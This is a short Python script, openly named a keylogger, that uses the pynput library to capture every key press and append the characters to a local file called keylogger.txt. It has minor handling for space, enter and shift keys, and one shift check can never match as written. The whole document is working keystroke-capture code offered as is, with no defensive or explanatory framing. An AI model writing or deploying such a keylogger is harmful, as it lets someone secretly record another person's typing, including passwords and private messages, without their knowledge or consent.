#!/usr/bin/python3

from pynput.keyboard import Listener


def write(key):
    letter = str(key)
    letter = letter.replace("'", "")

    if letter == 'Key.space':
        letter = " "
    if letter == 'Key.enter':
        letter = '\n'
    if letter == 'KEY.SHIFT':
        letter = letter.upper()
    if letter == 'Key.shift':
        letter = ''

    with open("keylogger.txt", "a") as f:
        f.write(letter)


with Listener(on_press=write) as listen:
    listen.join()

